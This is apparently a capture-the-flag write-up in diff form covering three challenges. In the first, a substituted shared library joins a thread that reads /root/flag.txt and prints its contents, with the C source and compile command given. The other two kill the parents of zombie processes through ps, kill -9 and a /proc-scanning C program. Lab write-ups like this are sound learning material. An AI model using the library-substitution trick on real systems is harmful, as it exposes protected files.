@@ -1,0 +1,100 @@
+1. needle
+we got Meeting.c and need to get the flag
+in the code retrieve_the_fabric reads /root/flag.txt in a separate thread
+our meeting function is loaded from libmeeting.so
+we can write our own meeting function that joins retrieval thread and prints its returned value
+compile with gcc -shared -fPIC -o libmeeting.so program_with_name.c -lpthread
+then run the program
+code:
+#include <stdio.h>
+#include <stdlib.h>
+#include <pthread.h>
+
+extern pthread_t retrieval;
+
+void* meeting(void* arg) {
+    void* result = NULL;
+
+    if (pthread_join(retrieval, &result) == 0 && result != NULL) {
+        printf("flag: %s\n", (char*)result);
+        fflush(stdout);
+    }
+
+    exit(0);
+    return NULL;
+}
+
+2. princess
+i used ps -eo pid,ppid,stat,comm to see the processes
+some princess processes had Z state which means zombie
+we need to kill their parent processes, the cabins, not the princesses
+ps -eo pid,ppid,stat,comm | grep 'Z' to see ppid of zombie process
+kill -9 ppids to kill parent processes
+new cabins appear, i just kill 50 processes and
+then checked ~/flag.txt
+
+3. princess2
+same idea as princess but now we need 100 cabins and there is no shell
+only gcc, nano/vim, rm and compiled programs are allowed
+so i wrote main.c  it scans /proc and reads each process status
+if the process is a zombie and its name starts with princess_, it gets the ppid and kills that cabin with SIGKILL
+ran ./main and it counted the killed cabins until 100
+then check /home/ctf 
+code:
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dirent.h>
+#include <ctype.h>
+#include <signal.h>
+#include <unistd.h>
+
+int main(void) {
+    int killed = 0;
+    while (killed < 100) {
+        DIR *dir = opendir("/proc");
+        struct dirent *entry;
+        while ((entry = readdir(dir)) != NULL) {
+            if (!isdigit((unsigned char)entry->d_name[0]))
+                continue;
+
+            char path[256];
+            char line[512];
+            char name[128];
+            char state;
+            int ppid;
+
+            snprintf(path, sizeof(path), "/proc/%s/status", entry->d_name);
+            FILE *f = fopen(path, "r");
+            if (f == NULL)
+                continue;
+
+            name[0] = '\0';
+            state = '\0';
+            ppid = 0;
+
+            while (fgets(line, sizeof(line), f)) {
+                if (strncmp(line, "Name:", 5) == 0)
+                    sscanf(line + 5, "%127s", name);
+                if (strncmp(line, "State:", 6) == 0)
+                    sscanf(line + 6, " %c", &state);
+                if (strncmp(line, "PPid:", 5) == 0)
+                    sscanf(line + 5, "%d", &ppid);
+            }
+
+            fclose(f);
+
+            if (state == 'Z' && ppid > 1 &&
+                strncmp(name, "princess_", 9) == 0) {
+                if (kill(ppid, SIGKILL) == 0) {
+                    killed++;
+                    printf("killed: %d/100\n", killed);
+                    fflush(stdout);
+                }
+            }
+        }
+        closedir(dir);
+    }
+    return 0;
+}
